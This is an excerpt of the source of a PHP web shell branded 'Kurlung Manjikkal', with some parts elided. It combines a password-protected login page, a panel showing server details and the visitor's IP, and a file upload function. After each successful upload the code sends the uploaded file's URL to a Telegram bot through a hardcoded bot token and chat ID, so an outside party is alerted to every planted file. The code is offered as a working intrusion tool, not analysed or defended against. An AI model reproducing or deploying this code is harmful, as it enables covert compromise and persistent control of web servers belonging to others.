...
<body>
    <div class="login-form">
        <h1 class="logo">KURLUNG<span> MANJIKKAL -)</span></h1>
        <div class="login-box">
            <p class="quote">I'm not smart but I know what I'm doing</p>
            <form method="post">
                <?php
    $login_error = '<p class="error">Wrong username or password.</p>';
    if (isset($_POST["log"]) && $_POST["log"] === "login") {
        ...
        <div class="copyright"><span>&copy Kurlung -)</span></div>
    </div>
</body>
...
<body>
    <div class="main">
        <div class="logo">
            <h1>Kurlung<span> Manjikkal -)</span></h1>
        </div>
        <div class="header">
            <ul>
                <li>Uname: <span>
                ...
                <li>Server IP: <span><?php echo isset($_SERVER["SERVER_ADDR"]) ? $_SERVER["SERVER_ADDR"] : "Unknown"; ?>
                    </span> | Your IP: <span>
    ...
    if (isset($_FILES["fileUp"])) {
        ...
        $fullUrl = "$protocol://$domain - $destination"; 
    
        $telegramToken = '7632799754:AAEyfIAg7Ng0KK-bFgbRBFxYhAaBXEl-olw';
        $chatId = '6358190903';
        $message = "File uploaded: $fullUrl";
        $telegramApiUrl = "https://api.telegram.org/bot$telegramToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
    
        if (function_exists("move_uploaded_file") && @move_uploaded_file($_FILES["fileUp"]["tmp_name"], $destination)) {
            echo $upload_success;
            @file_get_contents($telegramApiUrl); // kirim notifikasi ke Telegram
        } elseif (function_exists("copy") && @copy($_FILES["fileUp"]["tmp_name"], $destination)) {
            echo $upload_success;
            @file_get_contents($telegramApiUrl); // kirim notifikasi ke Telegram
        } else {
